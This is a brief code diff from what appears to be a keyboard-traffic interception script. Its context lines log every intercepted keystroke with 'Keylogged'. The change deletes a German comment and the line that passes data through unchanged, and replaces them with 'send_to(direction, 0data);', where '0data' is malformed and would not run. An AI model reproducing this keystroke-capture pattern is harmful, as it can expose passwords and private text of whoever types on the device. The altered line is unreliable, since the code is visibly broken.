@@ -31,7 +31,5 @@ fn process(direction, data) {
             print(`Keylogged: ${char}`);
         }
     }
-
-    // WICHTIG: Daten unverändert zurückgeben, damit der PC sie auch bekommt!
-    return data;
+    send_to(direction, 0data);
 }
